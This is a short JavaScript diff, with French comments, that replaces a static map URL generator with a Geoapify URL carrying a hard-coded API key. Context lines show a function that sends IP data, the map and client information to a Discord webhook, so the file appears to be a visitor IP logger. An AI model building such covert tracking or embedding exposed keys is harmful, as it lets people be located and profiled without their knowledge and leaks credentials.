@@ -44,8 +44,8 @@
 
     // Génère l'URL de la carte statique
     function getMapImageURL(lat, lon) {
-      return `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=10&size=600x300&markers=${lat},${lon},red-pushpin`;
-    }
+      return `https://maps.geoapify.com/v1/staticmap?style=osm-bright-smooth&width=600&height=400&center=lonlat:${lon},${lat}&zoom=14&apiKey=225ecbbf50c7433ba647097eeddf3f9b`;
+      }
 
     // Envoie toutes les infos au webhook Discord
     async function sendToDiscord(ipData, mapImageURL, clientInfo) {
